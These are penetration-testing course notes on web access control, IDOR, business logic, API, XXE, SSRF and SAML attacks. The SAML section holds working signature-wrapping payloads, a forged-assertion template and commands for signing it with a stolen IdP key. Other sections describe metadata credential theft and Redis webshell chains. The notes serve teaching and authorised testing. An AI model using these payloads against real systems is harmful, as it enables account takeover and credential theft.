path: PHANTOM/MODULE 2 — Web Application Pentesting/02.4 — Access Control, IDOR & Business Logic.md
title: 02.4 — Access Control, IDOR & Business Logic
body: 02.4 — Access Control, IDOR & Business Logic Why This Note Exists Access control and business logic vulnerabilities are the hardest class of web vulnerabilities to detect with scanners — they require understanding what the application is supposed to do and then testing whether it actually enforces that. No automated tool catches a price manipulation bug or a workflow skip. This is where a sharp tester earns their money, and where OWASP A01:2021 (Broken Access Control) sits as the number one web risk. This note covers three interconnected areas: Vertical access control — privilege escalation within the app (user → admin) Horizontal access control / IDOR — accessing other users' data at the same privilege level Business logic — abusing application workflows, not just direct object references Part 1 — Access Control Fundamentals What Access Control Is Access control enforces that authenticated users can only perform actions and access data that their role permits. It answers two questions after authentication: Authorisation : Is this user allowed to perform this action? Ownership : Does this user own the resource they're trying to access? Both checks must happen server side on every request. Client side enforcement (hidden buttons, JavaScript checks, disabled fields) is not access control — it's decoration. The Three Types Part 2 — Vertical Access Control Testing Finding Hidden Admin Functionality Applications often restrict UI access to admin functions but fail to restrict the underlying endpoints. The frontend hides the button; the backend doesn't check the role. Testing Vertical Access Control Bypass For every admin or privileged endpoint you discover, test it as a low privilege user. In Burp: Use the Autorize extension — it automatically replays every request you make as an admin with a low privilege user's token and flags when the response is the same. Role Parameter Manipulation Some applications pass role or permission information in client controlled fields. HTTP Method Override Some frameworks process or headers, allowing a POST to be treated as a DELETE or PUT. If the access control check only fires on the original method, switching methods bypasses it. Also try changing the HTTP method directly: Path Traversal in Access Control Some access controls use URL prefix matching — they check if the URL starts with but miss variations: Part 3 — Horizontal Access Control / IDOR What IDOR Is (And What It Isn't) IDOR (Insecure Direct Object Reference) = using a direct identifier to access an object without verifying the requesting user is authorised for that specific object . The common misconception: "IDOR only applies to sequential integer IDs." Wrong. IDOR exists whenever authorisation is not enforced per object — regardless of whether the ID is sequential, a UUID, a hash, or a filename. Switching from integers to UUIDs makes IDs harder to guess but does not fix the authorisation problem. Finding IDOR Attack Surface Map every place in the application that references an object identifier. The attack surface is broad — check all of: IDOR Testing Methodology You need two accounts at the same privilege level. Always. Testing IDOR with a single account is incomplete. Burp Intruder for IDOR Enumeration When IDs are sequential, automate the sweep: For ffuf: UUID / Hash Based IDOR When IDs are UUIDs or hashes, brute force is not feasible. Find them through: Encoded & Predictable References Indirect IDOR — Finding What Leaks Object IDs IDOR requires knowing the target ID. Look for: Part 4 — Business Logic Vulnerabilities Business logic flaws are vulnerabilities in the application's workflow design rather than its code implementation. Scanners don't find them. The only way to find them is to understand how the feature is supposed to work, then try to abuse the assumptions the developer made. Common Business Logic Categories 1. Price and Quantity Manipulation 2. Discount and Coupon Abuse 3. Workflow / Step Skipping Applications assume users follow steps in order. Test skipping or reversing steps. 4. Race Conditions When two or more operations happen simultaneously and the application doesn't handle concurrent access, race conditions allow: Applying a coupon multiple times before the "used" flag is set Withdrawing more funds than available (double spend) Registering the same username simultaneously from two requests Burp Repeater — Send Group in Parallel: 1. Capture the single use request in Burp 2. Create a Repeater tab group with 20 copies of the same request 3. Click "Send group (parallel)" — all 20 fire simultaneously 4. Check if multiple succeeded Turbo Intruder (Burp extension) — purpose built for race conditions: 5. Limit and Threshold Bypass 6. Trust Boundary Violations 7. Mass Assignment When an API blindly assigns all request body fields to a server side object, you can set fields that weren't in the original form. 8. State Machine Abuse Part 5 — Access Control Testing Checklist Use this on every web app engagement. Work through it systematically. Part 6 — Writing Up Access Control Findings IDOR Finding Example Business Logic Finding Example Quick Reference | Vulnerability | Where to Look | Test Technique | | | | | | Vertical BFLA | Admin endpoints, role checks | Autorize, manual token swap | | Horizontal IDOR | All object references | Two accounts, Intruder sweep | | Price manipulation | Checkout, cart, payment | Burp Repeater, modify price/qty | | Coupon abuse | Discount endpoints | Reuse, stack, race condition | | Workflow skip | Multi step processes | Navigate directly to later steps | | Race condition | Single use resources | Burp parallel, Turbo Intruder | | Mass assignment | POST/PUT endpoints | Add extra fields to body | | State machine | Order/status endpoints | Invalid transitions, reversal | | Limit bypass | Rate limited actions | X Forwarded For, new sessions | Related Notes 02.1 — OWASP Top 10 & Burp Suite 02.2 — Injection Attacks 02.3 — Authentication & Session Attacks 02.5 — Advanced Web Attacks & API Testing MODULE 6 — Privilege Escalation

path: PHANTOM/MODULE 2 — Web Application Pentesting/02.5 — Advanced Web Attacks & API Testing.md
title: 02.5 — Advanced Web Attacks & API Testing
body: 02.5 — Advanced Web Attacks & API Testing API Testing Modern applications are increasingly API first. The web frontend is just a consumer of the same API that mobile apps and third party integrations use. APIs are often less hardened than the main web app. Discovering API Endpoints Swagger / OpenAPI Documentation If the API has Swagger or OpenAPI docs exposed, you've found every endpoint, parameter, and expected data type. [!tip] Dev/staging environments often expose API docs that are removed from production. Test even if returns 404. Finding Hidden Parameters with Arjun Arjun discovers hidden GET and POST parameters that aren't visible in the normal requests. REST API Auth Testing Test every endpoint with: BFLA — Broken Function Level Authorization Regular users accessing admin level API functions. GraphQL Security Testing What GraphQL Is GraphQL is an API query language where the client specifies exactly what data it wants. Instead of multiple REST endpoints, there's one endpoint that accepts queries. Introspection — Dump the Schema GraphQL often allows introspection (querying the schema itself). This reveals every query, mutation, and data type. Visualise the schema: paste into https://graphql voyager.com GraphQL Attacks OAuth 2.0 Attacks OAuth Flow Overview Attack 1 — State Parameter CSRF The parameter prevents CSRF in OAuth flows. If it's missing or not validated: 1. Start OAuth flow, capture the redirect 2. If is not validated, an attacker can craft a link with a legitimate code 3. Victim clicks → their account linked to attacker's OAuth account Test: Initiate OAuth, capture the callback URL, replay it with a different value — does it work? Attack 2 — Authorization Code Interception If the redirect uri is not strictly validated: Test variations: Attack 3 — Token Leakage via Referer If the access token appears in the URL and the page loads external resources, the token leaks via the Referer header. Web Cache Poisoning What It Is Web caches store responses and serve them to multiple users. If an attacker can cause a response containing malicious content to be cached, it gets served to every subsequent user. How It Works Caches use cache keys (usually URL + Host) to store/retrieve responses. Some headers are "unkeyed" — they influence the response but aren't included in the cache key. Test with Param Miner (Burp extension): Automatically finds unkeyed headers and parameters that influence cached responses. HTTP Request Smuggling What It Is When a front end proxy and back end server disagree on where one HTTP request ends and another begins, an attacker can "smuggle" a request prefix into the beginning of the next user's request. Two ambiguous headers determine request length: — how many bytes the body is — body is split into chunks, ends with CL.TE attack: Front end uses CL (13 bytes), back end uses TE (ends at ). The text prepends the next request. Use Burp Suite HTTP Request Smuggler extension to detect and test: Install from BApp Store Right click request → Extensions → HTTP Request Smuggler → Smuggle Probe Nuclei — Template Based Vulnerability Scanner Nuclei is a fast, template based scanner. Community maintained templates cover thousands of CVEs, misconfigurations, and exposed panels. [!tip] Run Nuclei early in every web engagement. It catches low hanging fruit (exposed admin panels, outdated components with CVEs, sensitive files) that you'd otherwise find manually. Then focus manual effort on business logic and authentication. Insecure Deserialisation What It Is Applications serialise objects (convert to bytes/string for storage or transmission) and later deserialise them. If the app deserialises untrusted user input, an attacker can craft a malicious serialised object that triggers code execution during deserialisation. Java Deserialisation Signs: base64 encoded data starting with in cookies, POST bodies, or headers. PHP Deserialisation PHP on user input. Craft a PHP object that triggers a magic method ( , , ) with malicious code. Python Pickle Python on user data: Security Headers Testing Check what security headers are present (or missing) on every web app. | Header | Protection | Missing = Risk | | | | | | | Forces HTTPS | MITM on HTTP | | | Restricts script sources | XSS escalation | | | Prevents clickjacking | Clickjacking | | | Prevents MIME sniffing | Drive by download | | | Controls referrer header | Info leak | | | Restricts browser features | Feature abuse | Use https://securityheaders.com for a quick automated check. wfuzz — Web Fuzzer wfuzz is similar to ffuf but with more built in filtering options. Full Web App Testing Checklist Use this as a guide on every engagement: Quick Reference Related Notes 02.1 — OWASP Top 10 & Burp Suite 02.2 — Injection Attacks 02.3 — Authentication & Session Attacks 02.4 — Access Control, IDOR & Business Logic MODULE 7 — Post Exploitation & Pivoting XXE — XML External Entity Injection (Complete Reference) XML Primer (Just Enough To Understand The Attack) XML is a tag based, hierarchical data format. Three things matter for XXE: Element — a tag with content, like . The attack injects content via these. Attribute — on a tag. DOCTYPE — declares the document type and may include a DTD (Document Type Definition). The DTD is where entities live. What Is A DTD? A Document Type Definition is a schema for XML — it declares which elements/attributes are valid and (critically for our purposes) defines entities . An entity is a name that XML expands to content. Entities come in two main flavours: Internal entity: — expands to the literal string . External entity: — expands to the contents fetched from url . This is the attack primitive. The keyword tells the parser "look this up at the given URL/path." ( is similar but legacy — declares a public identifier first, then a fallback URL. Same exploit surface for our purposes.) How XXE Works The application parses attacker controlled XML containing an external entity declaration. When the parser encounters in the document, it dereferences the SYSTEM URL, fetches the resource (file contents or HTTP response), and substitutes that content into the document tree. If the application then echoes any part of that tree back to the response, the file contents come with it. The vulnerability exists because most XML parsers historically had external entity resolution enabled by default (libxml2, Java's , .NET's , Python's stdlib / ). Modern hardened defaults flipped this around 2014–2018, but legacy code, third party libraries, and SOAP services lag. Basic File Read (Linux) Line by line: — XML declaration. Required to use a DOCTYPE. — declares an inline DTD; "root" matches the root element name below. The brackets contain entity declarations. — declare an external entity named whose value is the contents of . — the application's root element, with a reference to our entity. Parser fetches the file and substitutes its contents here. If the application echoes the parsed back (e.g. as the body of a JSON response, an error message, or a confirmation page), is in the response. File Read (Windows) Note the forward slashes after the drive letter — Windows paths in URIs use not . SSRF Via XXE — The Cloud Metadata Path External entities aren't restricted to . Many parsers honour , , . Combine with cloud metadata service IPs and you have SSRF straight out of the parser: is the AWS Instance Metadata Service. The role name listed at then leads to: …which returns AWS access key, secret, and session token in JSON. From there, and you have AWS API access as that role. Other useful internal targets: IMDSv2 caveat: AWS IMDSv2 requires a first to obtain a session token ( ). XXE can only , so IMDSv2 only configurations are not directly exploitable via XXE. IMDSv1 is. Detect: if a plain works without a token, you're on v1. Special Wrappers — PHP Filter For Base64 Exfil Plain text files come back fine in — but binary files or files containing characters that break XML ( , ) corrupt the response. PHP's wrapper base64 encodes them first. The application reflects the base64 string back; you decode it locally. Works for (when readable), , , anything binary or XML unsafe. Other PHP wrappers (rarer but worth knowing): — runs a shell command if the extension is loaded → RCE — inline base64 content (used in chained exploits) Directory Listing (libxml2 only — varies by parser) This depends entirely on the parser. libxml2 returns directory listings on file:// URIs pointing at directories on some versions; most modern parsers return an error. Blind XXE — When There's No Response Body The application parses XML but doesn't echo anything back. Two paths: (a) Out Of Band (OOB) Detection Use an attacker controlled server (Burp Collaborator, interactsh) and an external DTD that pulls a target file then exfiltrates via DNS or HTTP. Host this on an attacker controlled web server ( ): And submit this XML to the target: Mechanism: the target loads the remote DTD, which defines , then defines as an entity whose URL contains 's contents (the file's bytes), then dereferences — making an HTTP request to your interactsh server with the file in the query string. You receive the HTTP request server side and read the file from the query string. (Use this only with files small enough not to break URL length or contain /binary that would mangle the request.) (b) XXE Via Error Messages Some parsers include the entity content in error messages when parsing fails. Define an entity referring to a non existent target so the parser fails after reading the file, leaking it in the error: Mechanism: the parser tries to fetch a path that includes 's contents, fails with "no such file or directory: /nonexistent/root:x:0:0:..." — and dumps that error back to you. XXE In Different Content Types XML lives in surprising places. JSON Endpoints That Accept XML Many REST endpoints accept in addition to for legacy clients. Switch the , send XML, and check whether the parser is enabled. SVG File Uploads SVG is XML. Upload an SVG to any avatar / image upload endpoint: If the server processes the SVG (rasterises it for thumbnails, or renders it inline), ends up rendered into the image or echoed back. Office (DOCX / XLSX / PPTX) Files These are ZIP archives of XML files. Unzip, edit a key XML file, re zip: Same trick for XLSX ( ) and PPTX ( ). Server side document processors (LibreOffice, Apache POI, OpenXML SDK) may parse the XML with external entities enabled. SOAP Web Services SOAP is XML. SOAP services are very often vulnerable to XXE because they pre date the modern hardened defaults and many haven't been refactored. Mitigations (For Reports) The fix is always: disable external entity processing in the parser . Language by language: Plus: input validation (reject , ), WAF rules to block known XXE patterns, monitoring outbound connections from parsers (a parser making an outbound HTTP request is suspicious by default). SSRF — Server Side Request Forgery (Complete Reference) What SSRF Is The server makes an HTTP (or other protocol) request whose destination is influenced by attacker input. The attacker doesn't make the request from their own machine — the server makes it on their behalf. Two categories of damage: 1. Internal access — the server has network reach the attacker doesn't (private subnets, internal services, cloud metadata). 2. Authentication piggyback — the server may be authenticated to internal services that won't accept connections from outside. Identifying SSRF Anywhere the application accepts a URL as input is a candidate: (image proxy / preview) (webhook configuration) (import data from URL) (fetching profile images) (PDF generation services that screenshot a URL) in URL shorteners or link preview generators File upload endpoints accepting SVG references XML/PDF/Office processing (XXE → SSRF chain, see above) HTTP header (in some configurations) Basic SSRF — Cloud Metadata IMDSv1 vs IMDSv2 Detection Plain SSRF can usually only , so IMDSv2 is much harder to exploit. Check whether returns (probably v2 only) or actual data (v1 — exploit immediately). Internal Port Scanning The server can reach internal hosts you can't. Use SSRF to map them. Differences in response (status code, size, response time) leak which targets are alive even when the application doesn't echo content. Filter Bypasses Most SSRF protections check whether the target is "internal" before making the request. The bypasses target weak parsing. When you hit a filter, SSRFmap automates many of these. Protocol Handlers — Beyond HTTP SSRF endpoints sometimes accept other URI schemes. Each unlocks different attack primitives. gopher:// — Sending Arbitrary TCP Bytes lets an SSRF endpoint send any TCP payload. Combined with internal Redis/memcached/MySQL, this often achieves RCE. Redis SSRF → RCE: That sends Redis the commands: , , , , . Redis writes a PHP webshell to the document root → SSRF → RCE. Generation tool: Gopherus — interactively builds these payloads for Redis, MySQL, FastCGI, SMTP, MongoDB, Memcached. Blind SSRF — Confirming Existence When responses don't reflect the fetched content, time based and OOB confirmation: SSRF To RCE — Common Chains 1. AWS metadata IAM theft → assume the role with or by setting / / env vars → call AWS APIs (S3 read, EC2 launch, IAM modification depending on role permissions). 2. Internal Redis / memcached / Elasticsearch without auth → write web shell via (Redis) or query/modify data (Elasticsearch). 3. Internal admin panels (Jenkins, Kibana, Hadoop, Tomcat manager) reachable from server but not from internet → upload a malicious plugin / WAR / job → RCE. 4. Server side PDF generators (wkhtmltopdf, headless Chromium) → SSRF + JavaScript injection → exfiltrate any internal page into the PDF. IDOR — Insecure Direct Object Reference (Complete Reference) Definition & Mechanism An IDOR exists when an application uses a direct identifier (an ID, filename, hash) for accessing an object without verifying that the requesting user is authorised to access that object. The fix is always: enforce authorisation per object on every request, regardless of whether the ID is "guessable." The common misconception that IDOR is about guessable IDs is wrong — switching to UUIDs doesn't fix IDOR if there's no auth check. UUIDs make discovery harder; they don't add authorisation. Real fix: every fetch checks . Examples Horizontal vs Vertical IDOR Horizontal IDOR — accessing data of another user at the same privilege level . User A reads User B's profile. (Same role, different identity.) Vertical IDOR — accessing data or actions reserved for a higher privilege level. Regular user accesses an admin only resource by hitting the admin endpoint directly. Often called "Broken Function Level Authorization" (BFLA in OWASP API Top 10) when the privilege boundary is functional, and "Broken Object Level Authorization" (BOLA) when it's per object. Testing Methodology 1. Map the application — enumerate every endpoint, every parameter, every object reference. Burp's Site Map + manual exploration. Two accounts (User A, User B) is non negotiable for proper IDOR testing. 2. Identify all object references — , , , , , , , , , , , . Also numeric path segments ( ). 3. Tamper systematically — for each object reference, replace with another known value (User B's ID) and check whether you get the data, an error, or a redirect. Three relevant outcomes: 200 with B's data — IDOR confirmed. 403 / "Forbidden" — properly authorised; record and move on. 404 — possibly authorised (object hidden) or doesn't exist. Differentiating requires comparing with a known existing object as User A. 4. Burp Intruder for ranges — when IDs are sequential, run a sniper attack across an ID range, then sort by response length. Anything with a notably different length is a candidate. 5. Don't forget the verb — endpoints often validate authorisation on but not on / / . Try every verb. 6. Look at every layer — request body parameters, JSON fields, cookies ( cookie), headers ( ), GraphQL query inputs. Encoded / Hashed References When IDs are encoded (base64, URL safe base64, hex) or hashed, the IDOR may still exist but discovery is harder. True random UUIDs (v4) are not brute forceable, but they often leak via: Email links (you receive your own UUID; can you guess collaborators'?) Reset / share / invite tokens that show up in logs / referrers listings that aren't authorisation filtered → returns all UUIDs, then test individually Audit logs / activity feeds visible to the wrong scope Real World Pattern Library Collected from countless engagements — these are where IDORs hide: Cookie Based / Mass Assignment IDOR Adjacent Fix In Reports Universal IDOR fix language: Implement object level authorisation on every API endpoint. For each request that references an object identifier, the server must verify that the authenticated principal has the required permission for that specific object — typically by joining on (or by checking ACL membership) before returning, modifying, or deleting the object. This check must occur server side regardless of whether the identifier is sequential, encoded, or a random UUID. Identifier opacity (UUIDs, hashes) is a secondary measure that reduces discovery probability but does not constitute authorisation. Recommend deploying authorisation policy as middleware (e.g. casbin, Open Policy Agent, Spring Security , Django ) so individual endpoint developers can't accidentally skip the check.

path: PHANTOM/MODULE 2 — Web Application Pentesting/02.6 — SAML & SSO Attacks.md
title: 02.6 - SAML & SSO Attacks
body: 02.6 SAML & SSO Attacks What SAML Is SAML (Security Assertion Markup Language) is an XML based authentication and authorisation protocol used for Single Sign On (SSO) in enterprise environments. It allows a user to authenticate once with an Identity Provider (IdP) and then access multiple Service Providers (SPs) without re authenticating. Common in: Okta, Azure AD, ADFS, OneLogin, PingFederate, Google Workspace — essentially every enterprise SSO deployment. Why it matters for pentesters: SAML is XML based, and XML signature verification is notoriously difficult to implement correctly. Subtle parser differences between the IdP and SP create vulnerabilities that allow authentication bypass, privilege escalation, and account takeover. SAML Flow Overview User (Browser) Service Provider (SP) Identity Provider (IdP) | | | | Access resource | | | | AuthnRequest (redirect) | |< Redirect to IdP | | | | | Authenticate with credentials | |< SAML Response (XML assertion, signed) | | | | POST SAML Response to SP | | | | Validate signature | | | Extract NameID/attributes | |< Session granted | | Key elements in a SAML Response: <samlp:Response ... <saml:Issuer https://idp.corp.com/</saml:Issuer <ds:Signature <! XML digital signature over the assertion </ds:Signature <saml:Assertion <saml:Subject <saml:NameID jsmith@corp.com</saml:NameID </saml:Subject <saml:AttributeStatement <saml:Attribute Name="Role" <saml:AttributeValue user</saml:AttributeValue </saml:Attribute </saml:AttributeStatement </saml:Assertion </samlp:Response The SP trusts whoever is named in the NameID — if you can control that value, you can authenticate as any user. Capturing a SAML Response Before testing, capture a legitimate SAML exchange: 1. Configure Burp Suite as your browser proxy 2. Log into any SSO protected application 3. In Burp HTTP History, look for a POST request to the SP's Assertion Consumer Service (ACS) URL 4. The POST body contains a parameter named SAMLResponse (base64 encoded XML) 5. In Burp: select the SAMLResponse value, right click Decoder Decode as Base64 6. You now have the raw XML to analyse and manipulate In Burp Repeater, you can modify the decoded XML and re encode before sending: Decode echo "BASE64 SAML RESPONSE" | base64 d saml response.xml Edit saml response.xml Re encode cat saml response.xml | base64 w0 Attack 1 XML Signature Wrapping (XSW) What It Is XML Signature Wrapping is the most powerful class of SAML attacks. It exploits the fact that XML digital signatures only sign a specific element, not the entire document. By moving the signed element and inserting a malicious copy, the signature remains valid while the SP reads attacker controlled content. The attack exploits the difference between: What the XML signature validation code reads (the signed element) What the application business logic reads (a different element in the same document) XSW Variants (XSW1 XSW8) Eight structural variants exist depending on how the SP's parser resolves element IDs: XSW1 Duplicate the Response, insert malicious content before the signed version: <samlp:Response <! MALICIOUS: unsigned copy with attacker's NameID <saml:Assertion <saml:NameID administrator@corp.com</saml:NameID </saml:Assertion <! ORIGINAL: signed, valid signature <saml:Assertion ID="signed id" <ds:Signature ...</ds:Signature <saml:NameID jsmith@corp.com</saml:NameID </saml:Assertion </samlp:Response If the SP reads the first Assertion for the NameID but validates the signature on the second, you authenticate as administrator while the signature check passes against the legitimate jsmith assertion. XSW2 Insert malicious Assertion as a sibling of the signed one (different position): <samlp:Response <saml:Assertion ID="signed id" <ds:Signature ...</ds:Signature <saml:NameID jsmith@corp.com</saml:NameID </saml:Assertion <! Malicious copy after the signed one <saml:Assertion <saml:NameID administrator@corp.com</saml:NameID </saml:Assertion </samlp:Response XSW3 XSW8 involve nesting the malicious content inside the signature's Object element, inside Extensions elements, or using different wrapping structures. The correct variant depends on how the target SP's parser resolves the Assertion. Testing XSW Manually Step 1: Capture a valid SAML response Step 2: Decode the base64 echo "$SAML RESPONSE" | base64 d original.xml Step 3: Create XSW variant duplicate the Assertion, change NameID in copy Edit original.xml: add a second Assertion before or after the signed one Change the NameID in the unsigned copy to: administrator@corp.com Leave the signed Assertion untouched Step 4: Re encode and submit cat modified.xml | base64 w0 | sed 's/+/%2B/g;s/=/%3D/g;s/\//%2F/g' URL encode the base64 before sending in a POST body Step 5: Observe did the SP log you in as administrator? Automated XSW Testing with saml raider (Burp Extension) SAML Raider is a Burp Suite extension that automates XSW variant testing. Install: Burp Suite Extender BApp Store search "SAML Raider" Install Usage: 1. Intercept the SAMLResponse POST request in Burp 2. Send to SAML Raider tab (right click Extensions SAML Raider) 3. The extension decodes and parses the XML automatically 4. XSW Attacks tab select variant (XSW1 through XSW8) 5. Change the NameID in the attack to your target user (administrator@corp.com) 6. Click "Send" for each variant 7. Observe which (if any) grants access as the target user Attack 2 Signature Exclusion (Missing Signature Validation) What It Is Some SPs do not actually verify that a SAML assertion is signed. They accept unsigned assertions or assertions where the signature element has been removed. This is an implementation bug rather than a protocol flaw. Testing Step 1: Capture a valid SAML response (authenticated as jsmith) echo "$SAML RESPONSE" | base64 d original.xml Step 2: Remove the entire ds:Signature block from the XML Edit original.xml: delete everything between <ds:Signature and </ds:Signature Step 3: Change the NameID to the target Replace: <saml:NameID jsmith@corp.com</saml:NameID With: <saml:NameID administrator@corp.com</saml:NameID Step 4: Re encode and submit cat modified.xml | base64 w0 If the SP accepts this: it is not validating signatures at all SAML Raider Automation 1. In SAML Raider: Signature tab Remove Signature 2. Edit the NameID manually in the XML view 3. Send Attack 3 XML Comment Injection What It Is Some XML parsers ignore comments within element values, while others include them. This creates a discrepancy: the signature is validated against the value including the comment, while the application reads the value without it. Vulnerable NameID handling: <! Signed value: "jsmith@corp.com" <saml:NameID jsmith<! @corp.com</saml:NameID Some parsers strip the comment and read "jsmith@corp.com" (valid signature). Others read "jsmith@corp.com" as is. The attack targets cases where you can inject a comment to truncate or modify a value: <! Original NameID <saml:NameID jsmith@corp.com</saml:NameID <! Injected: comment truncates some parsers read "administrator" <saml:NameID administrator<! .attacker@corp.com</saml:NameID This requires that the SP uses substring matching or prefix matching for user lookup rather than exact matching. Testing Modify the NameID in the decoded XML to include an XML comment before the @ or domain separator, then re encode and submit. If the response shows a different user session, the SP is vulnerable. Attack 4 Attribute Manipulation (Role/Group Escalation) What It Is If the SP does not sign or validate attribute statements within the assertion, an attacker who can modify the SAML response can change their role, group membership, or any other attribute the SP uses for authorisation. Vulnerable scenario: <saml:AttributeStatement <saml:Attribute Name="Role" <saml:AttributeValue user</saml:AttributeValue <! Change to: admin </saml:Attribute <saml:Attribute Name="Groups" <saml:AttributeValue employees</saml:AttributeValue <! Change to: administrators </saml:Attribute </saml:AttributeStatement Testing 1. Capture your SAML response 2. Decode and locate the AttributeStatement 3. Change the role/group attribute values to privileged equivalents 4. Re encode and submit via Burp Repeater 5. If the SP grants elevated access: attribute statements are not properly validated This is particularly relevant when: The signature only covers the Assertion element, not the AttributeStatement The SP uses SAML attributes for RBAC decisions (role=admin vs role=user) Attack 5 Replay Attack What It Is SAML responses contain validity windows (NotBefore, NotOnOrAfter). If the SP does not properly validate these timestamps, or if the replay window is long, a captured SAML response can be reused after the legitimate session ends. <saml:Conditions NotBefore="2024 01 01T10:00:00Z" NotOnOrAfter="2024 01 01T10:05:00Z" Testing Capture a SAMLResponse Wait 10 minutes Re submit the same SAMLResponse value in a new browser session If it creates a new authenticated session: replay is possible Also test: use a SAMLResponse from one browser in another browser simultaneously (tests whether assertion IDs are tracked to prevent reuse) What to Look For NotOnOrAfter window longer than 5 minutes (common misconfiguration: 60 minutes or more) No InResponseTo validation (the SP should check that the response matches a specific AuthnRequest) No assertion ID tracking (the same AssertionID can be replayed) Attack 6 SAML Response Forgery (When You Have the IdP Private Key) If during a pentest you have compromised the IdP server and extracted its private signing key, you can forge arbitrary SAML responses. Step 1: Extract IdP signing key from compromised IdP Common locations: ADFS: C:\ADFS\Microsoft.IdentityServer.Servicehost.exe.config Shibboleth: /opt/shibboleth idp/credentials/idp signing.key Okta/Azure: keys are in the cloud focus on token theft instead Step 2: Create a malicious SAML assertion XML cat forged assertion.xml << 'EOF' <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID=" forged123" Version="2.0" IssueInstant="2024 01 01T10:00:00Z" <saml:Issuer https://idp.corp.com/</saml:Issuer <saml:Assertion Version="2.0" ID=" assertion123" <saml:Issuer https://idp.corp.com/</saml:Issuer <saml:Subject <saml:NameID administrator@corp.com</saml:NameID </saml:Subject <saml:Conditions NotBefore="2024 01 01T09:55:00Z" NotOnOrAfter="2099 01 01T10:05:00Z" <saml:AudienceRestriction <saml:Audience https://sp.corp.com/</saml:Audience </saml:AudienceRestriction </saml:Conditions <saml:AuthnStatement AuthnInstant="2024 01 01T10:00:00Z" <saml:AuthnContext <saml:AuthnContextClassRef urn:oasis:names:tc:SAML:2.0:ac:classes:Password </saml:AuthnContextClassRef </saml:AuthnContext </saml:AuthnStatement </saml:Assertion </samlp:Response EOF Step 3: Sign the forged assertion with the stolen IdP key Using xmlsec1: sudo apt install xmlsec1 xmlsec1 sign privkey pem idp signing.key \ id attr:ID saml:Assertion \ forged assertion.xml signed forged.xml Step 4: Base64 encode and submit cat signed forged.xml | base64 w0 SAML Testing Checklist DISCOVERY Find SSO login buttons on the application Identify the IdP (Okta, ADFS, Azure AD, Shibboleth, etc.) Locate the ACS (Assertion Consumer Service) URL in Burp traffic Capture a complete SAML flow in Burp HTTP History INFORMATION GATHERING FROM THE ASSERTION Decode the SAMLResponse (base64 XML) Note the NameID format and value Note all Attribute names and values (roles, groups, email, etc.) Note the Conditions window (NotBefore/NotOnOrAfter) Note whether the Assertion is signed, the Response is signed, or both SIGNATURE VALIDATION TESTS Remove the signature entirely submit does SP accept unsigned? Modify the signed content slightly submit is tampered signature rejected? (If accepted: signature is not being verified) XSW TESTS (use SAML Raider extension) XSW1 through XSW8 variants Change NameID in the unsigned copy to administrator@corp.com or admin Watch for different session identity in the response ATTRIBUTE MANIPULATION Change Role attribute to admin/administrator/superuser Change Groups attribute to Administrators/Domain Admins Add new attributes (isAdmin=true, role=admin) REPLAY TESTS Check NotOnOrAfter window is it longer than 5 minutes? Re submit a captured response in a fresh browser session COMMENT INJECTION Insert XML comment into NameID value before the @ symbol Test with and without signature to isolate the issue Tools Reference SAML Raider (Burp Extension): Install from BApp Store Decodes SAML automatically, runs XSW variants, modifies attributes The primary tool for SAML testing in Burp SAMLTool (online): https://www.samltool.com/decode.php Useful for quickly decoding/encoding SAML outside Burp Python saml2 library (for scripted testing): pip3 install pysaml2 Useful for building custom SAML clients and forging assertions xmlsec1 (for signing forged assertions): sudo apt install xmlsec1 xmlsec1 sign privkey pem key.pem id attr:ID saml:Assertion input.xml Writing Up SAML Findings XSW finding example: Finding: SAML XML Signature Wrapping Authentication Bypass Severity: Critical CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H CVSS Score: 8.8 Description: The application's SAML assertion consumer does not correctly validate the binding between the XML digital signature and the assertion it is intended to protect. By duplicating the assertion element and changing the NameID in the unsigned copy (XSW1 variant), an authenticated user can gain access to any account. Evidence: Authenticated as jsmith@corp.com, a valid SAMLResponse was captured. The NameID in an unsigned duplicate assertion was changed to administrator@corp.com. The modified response was accepted and a session for administrator@corp.com was created. Reproduction Steps: 1. Authenticate via SSO as jsmith@corp.com 2. Intercept the SAMLResponse POST to /saml/acs in Burp Suite 3. Decode the SAMLResponse from base64 4. Duplicate the saml:Assertion element 5. Change the NameID in the first (unsigned) copy to administrator@corp.com 6. Re encode and forward the request 7. Observe that session is created for administrator@corp.com Impact: Any authenticated user can impersonate any other user including administrators, gaining full access to their data and functions. Remediation: Ensure the SAML library enforces that the digital signature covers exactly the assertion that is consumed by the application. The SP must resolve the Assertion by its signed ID attribute and reject any unsigned assertion elements present in the document. Update to a maintained SAML library and review against the OWASP SAML Security Cheat Sheet. Quick Reference Decode SAMLResponse echo "BASE64VALUE" | base64 d response.xml Re encode after modification cat modified.xml | base64 w0 URL encode base64 for POST body cat modified.xml | base64 w0 | python3 c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))" Sign a forged assertion xmlsec1 sign privkey pem idp signing.key id attr:ID saml:Assertion input.xml Quick XML pretty print for reading cat response.xml | python3 c "import sys; import xml.dom.minidom; print(xml.dom.minidom.parseString(sys.stdin.read()).toprettyxml())" Attack summary: XSW1 XSW8 Duplicate assertion, change NameID in unsigned copy No signature check Remove ds:Signature block entirely, change NameID Attribute abuse Change Role/Groups attribute values Comment injection Insert XML comment into NameID to confuse parser Replay Re submit captured SAMLResponse in new session Forged assertion Sign a crafted XML with stolen IdP private key Related Notes 02.1 OWASP Top 10 & Burp Suite 02.3 Authentication & Session Attacks 02.4 Access Control, IDOR & Business Logic 02.5 Advanced Web Attacks & API Testing MODULE 4 Active Directory Pentesting

path: PHANTOM/MODULE 3 — Network Pentesting/03.1 — Network Scanning & SMB Attacks.md
title: 03.1 — Network Scanning & SMB Attacks
